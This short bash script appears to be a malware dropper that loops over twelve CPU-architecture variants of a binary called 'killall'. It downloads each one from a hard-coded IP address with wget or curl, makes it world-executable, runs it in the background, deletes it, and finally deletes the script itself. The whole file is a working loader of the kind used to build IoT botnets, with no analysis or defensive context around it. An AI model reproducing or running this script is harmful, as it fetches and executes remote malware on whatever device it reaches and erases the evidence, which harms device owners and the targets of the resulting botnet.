#!/bin/bash

URL="http://45.135.193.206/killall"

FILES="killall_arm killall_arm6 killall_m68k killall_mipsel killall_sh4 killall_x86 killall_arm5 killall_arm7 killall_mips killall_ppc killall_spc killall_x86_64"

for f in $FILES; do
    if command -v wget >/dev/null 2>&1; then
        wget $URL/$f -O $f
    elif command -v curl >/dev/null 2>&1; then
        curl -O $f $URL/$f
    else
        continue
    fi
    if [ -f $f ]; then
        chmod 777 $f
        ./$f &
        sleep 3
        rm -f $f
    fi
done

rm -f deploy.sh
